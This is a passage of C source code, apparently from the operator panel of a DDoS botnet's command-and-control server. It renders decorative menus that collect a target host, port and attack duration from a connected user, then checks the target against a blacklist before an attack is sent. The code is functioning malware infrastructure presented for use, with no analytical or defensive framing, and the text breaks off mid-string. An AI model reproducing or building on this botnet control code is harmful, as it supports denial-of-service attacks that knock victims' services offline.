                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠿⡛⠁⡌⣟⣛⠛⠩⠶⣢⡿⢟⠈⡿⠋⣴⣶⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡟⠕⠾⠋⣠⡺⡱⡞⢁⣾⣿⣿⠩⠊⠃⠘⣡⣾⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⢟⣡⠀⡠⡶⢮⢡⡺⠀⠞⣫⡶⣠⢡⠂⣤⣷⡈⢿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣦⣛⣼⣿⣿⣿⣬⣘⣥⣬⣵⣾⣿⣮⣤⣿⣿⣷⡘⢿⡟⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTarget\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 5){
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠟⠉⣀⡐⢨⣭⡋⢛⢛⢛⡛⠙⠿⢛⠛⠻⣿⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡧⡁⠀⣭⣤⣾⡟⠀⣸⢟⣩⡔⠀⢼⡟⣷⠀⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⢫⣴⠁⣿⠀⠹⢫⡭⠁⡐⣏⠺⡛⠀⣴⣶⣶⡟⢀⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⢸⢁⣑⡛⠀⠀⣿⡇⣰⣟⣿⢡⠀⠀⣛⡛⠛⠠⢾⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣯⣥⣭⣉⣥⣶⣵⣮⣥⣿⣿⣿⣷⣄⣭⣭⣴⣾⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTarget\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 6){ 
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⡟⠘⣿⠟⣉⡴⡋⢨⢻⡿⠃⣽⣿⡿⢟⡫⢀⢸⣿⣿⠋⢰⣦⣶⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣟⣵⢆⠐⣭⠩⡚⠁⣼⣈⠅⢀⡽⠑⠛⢁⠴⠩⡚⣭⠅⡇⠘⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⡿⣣⣿⡇⢟⣖⠇⣶⣙⣿⠰⣻⠲⢃⣦⣿⣇⠟⣱⣃⠾⢃⣠⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTarget\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 7){ 
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⠿⣿⣿⣿⣿⢟⡍⣿⣿⣿⡿⠿⠿⢿⣿⣿⡿⠿⣿⠿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣼⡈⢻⣿⡇⠏⢠⣿⡿⡁⠀⣿⣧⣬⡟⢁⣤⣛⣛⣥⣾⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣟⣾⡇⢸⡟⠁⡠⢛⣛⢣⡇⠀⣿⣿⠿⠂⢈⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⡇⠘⢠⣾⢰⡿⠯⣣⣿⠀⢸⠁⣠⣾⠿⠿⢿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣧⡀⣿⣿⡮⡣⠾⠶⠂⣠⡎⠀⢭⣶⠿⣋⣼⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTarget\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 8){ 
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡿⠿⠿⠛⣩⣵⢌⣿⣿⠃⢙⢿⣿⣿⠸⠿⠿⠛⣩⣶⢌⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡾⠋⣠⣬⣭⣷⡿⣫⡶⠁⣸⢸⡿⠃⡸⠋⣠⣬⣭⣶⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⠁⣰⣿⡿⠟⠋⠾⡙⠁⣰⣿⢸⠁⡐⠀⣼⣿⠿⠛⢻⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⠀⢟⣵⡾⢋⣆⢾⡆⣰⣹⣿⠀⣸⣇⠀⢋⣵⡿⣫⣾⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣟⣛⣤⣤⣥⣾⣿⣿⣦⣅⣿⣿⣿⣦⣟⣫⣤⣤⣵⣾⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTarget\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto networkcenter;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            sprintf(mytarg, "%s", buf);
            Trim(mytarg);
            memset(buf, 0, sizeof(buf));
            int targ_black = 0;
            char *line = NULL;
            size_t n = 0;
            FILE *f = fopen(""LFD"/BLACK.lst", "r");
            while (getline(&line, &n, f) != -1){
                if (strstr(line , mytarg) != NULL){
                    targ_black = 1;
                }
            }
            fclose(f);
            free(line);
            if(targ_black > 0){
                printf(""CY"["Y"BLACK ATTEMPT"CY"]["R"%s"CY"]: "R". %s %s\n", ACCS[fnd].vivu, ftype, mytarg);
                sprintf(vivid, "                 "R"["CY"%s - Attack Not Sent! Host %s is Blacklisted..."R"]\r\n", MNGRS[vivfd].nick, mytarg);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                memset(mytarg, 0, sizeof(mytarg));
                memset(myport, 0, sizeof(myport));
                memset(mysecs, 0, sizeof(mysecs));
                sleep(5);
                goto networkcenter;
            }
            if(atk_wtng == 1){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⢿⣿⣿⡿⢿⣿⣿⣿⡿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠿⣿⠿⠿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⠃⢸⣿⣿⡇⠈⣿⠿⣛⠅⢈⣴⣶⡄⠙⣿⣿⡿⣋⠀⣱⣶⡆⢹"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣧⣨⠅⠀⣼⠿⡟⠀⠄⣵⣾⠏⠀⣜⣛⣽⡇⢀⢛⡵⢪⠁⢀⡬⠟⢀⣾"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⡏⢀⣼⣯⠊⠀⢈⣶⡬⡊⠀⣾⣿⣿⡟⢁⣆⠛⣩⠀⢠⣭⣵⣶⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⡇⢼⡿⢫⠀⣼⣿⣿⡜⠀⣦⡵⠖⣂⣤⣿⣽⡹⢿⢠⣷⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣶⣾⣿⣷⣶⣿⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mPort\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 2){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⢿⠛⢛⣿⠿⢿⣿⣿⣿⢿⡿⢿⣿⣿⡿⣿⠿⢿⣿⣿⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⣛⣛⣣⣾⡟⢀⣢⡤⢀⣴⣞⣣⠿⣫⠀⣵⣷⠈⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⡿⣫⡍⢀⢺⠋⣰⣿⡿⠟⡵⠏⠂⠰⣝⣡⣾⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣇⢿⢀⣾⣿⠀⢫⡷⢟⣥⢶⡇⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣷⣾⣿⣽⣶⣶⣾⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mPort\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 3){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠟⢉⣭⢉⡌⢹⣿⣿⠙⣿⣿⡿⠉⢻⣿⣿⠙⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡿⠿⠏⡆⠈⣿⠏⢠⣾⣿⠏⢠⢟⣭⠎⢀⠎⣿⠃⢰⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⡏⡴⠿⢄⣷⠀⠋⢰⡿⠟⠁⡠⡇⠣⠁⠀⣾⢸⠃⣰⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⡷⢜⠰⠷⠂⣠⡕⣢⡌⢀⣶⣾⣧⡻⢠⣧⣿⣎⢰⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mPort\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 4){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠿⡛⠁⡌⣟⣛⠛⠩⠶⣢⡿⢟⠈⡿⠋⣴⣶⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡟⠕⠾⠋⣠⡺⡱⡞⢁⣾⣿⣿⠩⠊⠃⠘⣡⣾⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⢟⣡⠀⡠⡶⢮⢡⡺⠀⠞⣫⡶⣠⢡⠂⣤⣷⡈⢿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   